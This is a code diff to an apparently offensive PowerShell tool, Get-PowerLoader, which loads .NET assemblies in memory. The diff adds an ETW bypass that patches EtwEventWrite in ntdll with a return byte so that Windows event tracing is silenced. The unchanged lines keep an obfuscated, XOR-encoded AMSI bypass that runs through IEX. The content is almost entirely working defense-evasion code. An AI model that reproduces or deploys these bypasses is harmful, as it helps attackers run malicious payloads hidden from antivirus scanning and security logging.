@@ -46,7 +46,7 @@ function Get-PowerLoader {
         [string[]]
         $ArgumentList,
 
-        [ValidateSet("AMSI")]
+        [ValidateSet("AMSI","ETW")]
         [string[]]
         $Bypass
     )
@@ -80,13 +80,14 @@ function Get-PowerLoader {
         $srcArgs = '$args = $null' + [Environment]::NewLine
     }
 
+    $srcBypass = ''
     switch ($Bypass) {
         'AMSI' {
             $srcBypass += '$a = "H4sIAAAAAAAEAD2MsQrCMBQAv8UhoRVLdunQyToIYtUKIhLqa/uEpA+TPAilH2/r4Hhwd+zjKLRxmN/P0D9U4RyYl41qB3yNH0hlFR2DUQdNugMDxKoIPBjNOJAq5lKu5YXROplsRY9g2/w3XA7lgqlccE/Is1lqtNDKTB4HOoWXxSareH41/1pVwDdtA6SCgrWZYB8gmRrNzXusPTJsau0JqVuJ5/QFxk/YMsAAAAA="' + [Environment]::NewLine
             $srcBypass += 'IEX $([Text.Encoding]::UTF8.GetString($(Get-DecodedBytes($a) | foreach {$_ -bxor 1})))' + [Environment]::NewLine
         }
-        Default {
-            $srcBypass = ''
+        'ETW' {
+            $srcBypass += '& ' + ${function:Invoke-EtwBypass}.Ast.Body.Extent.Text + [Environment]::NewLine
         }
     }
 
@@ -189,7 +190,6 @@ function Local:Invoke-NetLoader {
 
         [string[]] $ArgumentList
     )
-
     $output = New-Object IO.StringWriter
     [Console]::SetOut($output)
     $assembly = [Reflection.Assembly]::Load([byte[]]$Code)
@@ -204,4 +204,28 @@ function Local:Invoke-NetLoader {
     finally {
         Write-Output $output.ToString()
     }
+}
+
+function Local:Invoke-EtwBypass {
+    $win32 = @"
+using System.Runtime.InteropServices;
+using System;
+public class Win32 {
+[DllImport("kernel32")]
+public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+[DllImport("kernel32")]
+public static extern IntPtr LoadLibrary(string name);
+[DllImport("kernel32")]
+public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+}
+"@
+    Add-Type $win32
+    $address = [Win32]::GetProcAddress([Win32]::LoadLibrary("ntdll.dll"), "EtwEventWrite")
+    $a = 0
+    $b = 0
+    $h = New-Object Byte[] 1
+    $h[0] = 0xc3
+    [Win32]::VirtualProtect($address, [UInt32]$h.Length, 0x40, [Ref]$a) | Out-Null
+    [System.Runtime.InteropServices.Marshal]::Copy($h, 0, $address, [UInt32]$h.Length)
+    [Win32]::VirtualProtect($address, [UInt32]$h.Length, $a, [Ref]$b) | Out-Null
 }
